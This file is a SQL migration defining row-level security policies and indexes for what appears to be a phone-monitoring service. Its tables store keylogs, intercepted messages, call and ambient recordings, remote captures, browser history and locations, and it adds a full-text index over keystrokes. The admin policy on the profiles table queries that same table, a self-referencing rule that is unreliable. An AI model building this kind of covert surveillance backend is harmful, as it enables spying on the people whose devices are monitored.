-- Add comprehensive RLS policies for all core tables

-- Profiles: users can read/update their own profile
CREATE POLICY "select_own_profile" ON profiles FOR SELECT
  TO authenticated USING (auth.uid() = id);

CREATE POLICY "update_own_profile" ON profiles FOR UPDATE
  TO authenticated USING (auth.uid() = id);

-- Admins can read all profiles
CREATE POLICY "admin_read_profiles" ON profiles FOR SELECT
  TO authenticated USING (
    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')
  );

-- Devices: users own their devices
CREATE POLICY "select_own_devices" ON devices FOR SELECT
  TO authenticated USING (auth.uid() = user_id);

CREATE POLICY "insert_own_devices" ON devices FOR INSERT
  TO authenticated WITH CHECK (auth.uid() = user_id);

CREATE POLICY "update_own_devices" ON devices FOR UPDATE
  TO authenticated USING (auth.uid() = user_id);

CREATE POLICY "delete_own_devices" ON devices FOR DELETE
  TO authenticated USING (auth.uid() = user_id);

-- Locations: users can access their device locations
CREATE POLICY "select_own_locations" ON locations FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_locations" ON locations FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Geofences: users own their geofences
CREATE POLICY "select_own_geofences" ON geofences FOR SELECT
  TO authenticated USING (auth.uid() = user_id);

CREATE POLICY "insert_own_geofences" ON geofences FOR INSERT
  TO authenticated WITH CHECK (auth.uid() = user_id);

CREATE POLICY "update_own_geofences" ON geofences FOR UPDATE
  TO authenticated USING (auth.uid() = user_id);

CREATE POLICY "delete_own_geofences" ON geofences FOR DELETE
  TO authenticated USING (auth.uid() = user_id);

-- Geofence alerts: users can see alerts for their devices
CREATE POLICY "select_own_geofence_alerts" ON geofence_alerts FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_geofence_alerts" ON geofence_alerts FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Messages: users can access their device messages
CREATE POLICY "select_own_messages" ON messages FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_messages" ON messages FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Call logs: users can access their device call logs
CREATE POLICY "select_own_call_logs" ON call_logs FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_call_logs" ON call_logs FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- App usage: users can access their device app usage
CREATE POLICY "select_own_app_usage" ON app_usage FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_app_usage" ON app_usage FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "update_own_app_usage" ON app_usage FOR UPDATE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Keylogs: users can access their device keylogs
CREATE POLICY "select_own_keylogs" ON keylogs FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_keylogs" ON keylogs FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Browser history: users can access their device browser history
CREATE POLICY "select_own_browser_history" ON browser_history FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_browser_history" ON browser_history FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "update_own_browser_history" ON browser_history FOR UPDATE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Media files: users can access their device media
CREATE POLICY "select_own_media_files" ON media_files FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_media_files" ON media_files FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "delete_own_media_files" ON media_files FOR DELETE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Subscriptions: users own their subscriptions
CREATE POLICY "select_own_subscriptions" ON subscriptions FOR SELECT
  TO authenticated USING (auth.uid() = user_id);

-- Admin can see all subscriptions
CREATE POLICY "admin_read_subscriptions" ON subscriptions FOR SELECT
  TO authenticated USING (
    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')
  );

CREATE POLICY "insert_own_subscriptions" ON subscriptions FOR INSERT
  TO authenticated WITH CHECK (auth.uid() = user_id);

-- Support tickets: users can manage their tickets
CREATE POLICY "select_own_support_tickets" ON support_tickets FOR SELECT
  TO authenticated USING (auth.uid() = user_id);

CREATE POLICY "insert_own_support_tickets" ON support_tickets FOR INSERT
  TO authenticated WITH CHECK (auth.uid() = user_id);

CREATE POLICY "update_own_support_tickets" ON support_tickets FOR UPDATE
  TO authenticated USING (auth.uid() = user_id);

-- Admin can manage all tickets
CREATE POLICY "admin_manage_support_tickets" ON support_tickets FOR ALL
  TO authenticated USING (
    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')
  );

-- System logs: admin only
CREATE POLICY "admin_read_system_logs" ON system_logs FOR SELECT
  TO authenticated USING (
    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')
  );

CREATE POLICY "admin_insert_system_logs" ON system_logs FOR INSERT
  TO authenticated WITH CHECK (
    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')
  );

-- Blocked items: users can manage their device blocks
CREATE POLICY "select_own_blocked_items" ON blocked_items FOR SELECT
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "insert_own_blocked_items" ON blocked_items FOR INSERT
  TO authenticated WITH CHECK (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "delete_own_blocked_items" ON blocked_items FOR DELETE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

-- Delete policies for new tables
CREATE POLICY "delete_own_screenshots" ON screenshots FOR DELETE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "delete_own_remote_captures" ON remote_captures FOR DELETE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "delete_own_call_recordings" ON call_recordings FOR DELETE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

CREATE POLICY "delete_own_ambient_recordings" ON ambient_recordings FOR DELETE
  TO authenticated USING (
    device_id IN (SELECT id FROM devices WHERE user_id = auth.uid())
  );

---- Additional indexes for performance optimization

-- User lookup indexes
CREATE INDEX IF NOT EXISTS idx_profiles_email ON profiles(email);
CREATE INDEX IF NOT EXISTS idx_profiles_subscription_status ON profiles(subscription_status);

-- Device indexes
CREATE INDEX IF NOT EXISTS idx_devices_is_online ON devices(is_online);
CREATE INDEX IF NOT EXISTS idx_devices_last_sync ON devices(last_sync DESC);

-- Text search indexes
CREATE INDEX IF NOT EXISTS idx_messages_text_search ON messages USING gin(to_tsvector('english', message_text));
CREATE INDEX IF NOT EXISTS idx_keylogs_text_search ON keylogs USING gin(to_tsvector('english', text_input));
CREATE INDEX IF NOT EXISTS idx_browser_history_url_search ON browser_history USING gin(to_tsvector('english', url));

-- Composite indexes for common queries
CREATE INDEX IF NOT EXISTS idx_locations_device_timestamp ON locations(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_messages_device_timestamp ON messages(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_call_logs_device_timestamp ON call_logs(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_geofences_device_active ON geofences(device_id, is_active);
